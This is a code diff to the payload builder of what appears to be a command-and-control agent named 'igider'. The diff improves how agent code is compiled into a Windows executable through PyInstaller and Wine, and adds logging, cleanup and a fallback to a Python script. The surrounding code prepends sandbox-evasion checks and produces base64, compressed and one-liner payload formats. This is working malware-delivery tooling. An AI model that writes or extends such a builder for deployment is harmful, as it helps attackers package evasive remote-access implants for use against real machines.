@@ -13,6 +13,7 @@ import random
 import string
 import logging
 import subprocess
+import shutil
 from typing import Dict, Any, List, Optional
 from itertools import cycle
 import datetime
@@ -339,10 +340,6 @@ def check_environment():
         pass
     
     return True
-
-# if not check_environment():
-#     import sys
-#     sys.exit(0)
 """)
     
         return "\n".join(evasion_code) + "\n" + code
@@ -350,10 +347,24 @@ def check_environment():
     def _build_exe(self, code: str, temp_dir: str) -> bytes:
         """Compile Python code into an executable using PyInstaller."""
         try:
+            # Ensure temporary directory exists
+            os.makedirs(temp_dir, exist_ok=True)
+            self.logger.debug(f"Using temporary directory: {temp_dir}")
+
             # Create temporary file for the code
-            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as temp_file:
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', dir=temp_dir, delete=False) as temp_file:
                 temp_file.write(code)
                 temp_file_path = temp_file.name
+                self.logger.debug(f"Temporary Python file created: {temp_file_path}")
+
+            # Verify PyInstaller is available
+            pyinstaller_check = subprocess.run(
+                ["pyinstaller", "--version"],
+                capture_output=True,
+                text=True
+            )
+            if pyinstaller_check.returncode != 0:
+                raise RuntimeError(f"PyInstaller not found or failed to run: {pyinstaller_check.stderr}")
 
             # PyInstaller command
             output_path = os.path.join(temp_dir, "igider.exe")
@@ -364,10 +375,12 @@ def check_environment():
                 "--distpath", temp_dir,
                 "--workpath", os.path.join(temp_dir, "build"),
                 "--specpath", os.path.join(temp_dir, "spec"),
+                "--log-level", "INFO",
                 temp_file_path
             ]
 
             # Run PyInstaller
+            self.logger.debug(f"Running PyInstaller command: {' '.join(pyinstaller_cmd)}")
             result = subprocess.run(
                 pyinstaller_cmd,
                 capture_output=True,
@@ -375,30 +388,44 @@ def check_environment():
             )
 
             if result.returncode != 0:
+                self.logger.error(f"PyInstaller failed with exit code {result.returncode}")
+                self.logger.error(f"PyInstaller stdout: {result.stdout}")
+                self.logger.error(f"PyInstaller stderr: {result.stderr}")
                 raise RuntimeError(f"PyInstaller failed: {result.stderr}")
+
+            # Verify the executable exists
+            if not os.path.exists(output_path):
+                self.logger.error(f"Executable not found at: {output_path}")
+                raise FileNotFoundError(f"Executable not found at: {output_path}")
 
             # Read the compiled executable
             with open(output_path, "rb") as exe_file:
                 exe_content = exe_file.read()
-
-            # Clean up temporary files
-            for path in [temp_file_path, output_path]:
-                try:
-                    os.remove(path)
-                except:
-                    pass
-            for folder in [os.path.join(temp_dir, "build"), os.path.join(temp_dir, "spec")]:
-                try:
-                    import shutil
-                    shutil.rmtree(folder)
-                except:
-                    pass
+                self.logger.debug(f"Executable created successfully, size: {len(exe_content)} bytes")
 
             return exe_content
 
         except Exception as e:
             self.logger.error(f"Failed to build .exe: {str(e)}")
             raise
+        finally:
+            # Clean up temporary files and directories
+            for path in [temp_file_path] if 'temp_file_path' in locals() else []:
+                try:
+                    os.remove(path)
+                    self.logger.debug(f"Removed temporary file: {path}")
+                except:
+                    self.logger.debug(f"Failed to remove temporary file: {path}")
+            for folder in [os.path.join(temp_dir, "build"), os.path.join(temp_dir, "spec"), output_path] if 'output_path' in locals() else []:
+                try:
+                    if os.path.isfile(folder):
+                        os.remove(folder)
+                        self.logger.debug(f"Removed file: {folder}")
+                    elif os.path.isdir(folder):
+                        shutil.rmtree(folder)
+                        self.logger.debug(f"Removed directory: {folder}")
+                except:
+                    self.logger.debug(f"Failed to remove: {folder}")
 
     async def build(self) -> BuildResponse:
         resp = BuildResponse(status=BuildStatus.Success)
@@ -479,23 +506,43 @@ def check_environment():
             
             output_format = self.get_parameter("output")
             with tempfile.TemporaryDirectory() as temp_dir:
-                if output_format == "exe":
-                    resp.payload = self._build_exe(base_code, temp_dir)
-                    resp.build_message = "Successfully built executable payload"
-                elif output_format == "base64":
-                    resp.payload = base64.b64encode(base_code.encode())
-                    resp.build_message = "Successfully built payload in base64 format"
-                elif output_format == "py_compressed":
-                    compressed_code = self._compress_code(base_code)
-                    resp.payload = compressed_code.encode()
-                    resp.build_message = "Successfully built compressed Python payload"
-                elif output_format == "one_liner":
-                    one_liner = self._create_one_liner(base_code)
-                    resp.payload = one_liner.encode()
-                    resp.build_message = "Successfully built one-liner payload"
-                else:
-                    resp.payload = base_code.encode()
-                    resp.build_message = "Successfully built Python script payload"
+                try:
+                    if output_format == "exe":
+                        # Check if running on a compatible environment for .exe
+                        if os.name != 'posix':
+                            raise RuntimeError("EXE compilation is only supported on Linux with Wine for cross-compilation")
+                        
+                        # Verify required dependencies
+                        try:
+                            subprocess.run(["wine", "--version"], capture_output=True, check=True)
+                        except subprocess.CalledProcessError:
+                            raise RuntimeError("Wine is required for EXE compilation but not found")
+                        
+                        resp.payload = self._build_exe(base_code, temp_dir)
+                        resp.build_message = "Successfully built executable payload"
+                    elif output_format == "base64":
+                        resp.payload = base64.b64encode(base_code.encode())
+                        resp.build_message = "Successfully built payload in base64 format"
+                    elif output_format == "py_compressed":
+                        compressed_code = self._compress_code(base_code)
+                        resp.payload = compressed_code.encode()
+                        resp.build_message = "Successfully built compressed Python payload"
+                    elif output_format == "one_liner":
+                        one_liner = self._create_one_liner(base_code)
+                        resp.payload = one_liner.encode()
+                        resp.build_message = "Successfully built one-liner payload"
+                    else:
+                        resp.payload = base_code.encode()
+                        resp.build_message = "Successfully built Python script payload"
+                except Exception as e:
+                    if output_format == "exe":
+                        self.logger.warning(f"EXE build failed: {str(e)}. Falling back to Python script.")
+                        await self.update_build_step("Finalizing Payload", f"EXE build failed: {str(e)}. Falling back to Python script.", False)
+                        resp.payload = base_code.encode()
+                        resp.build_message = "EXE build failed, fell back to Python script payload"
+                        build_errors.append(f"EXE build failed: {str(e)}")
+                    else:
+                        raise
             
             if build_errors:
                 resp.build_stderr = "Warnings during build:\n" + "\n".join(build_errors)
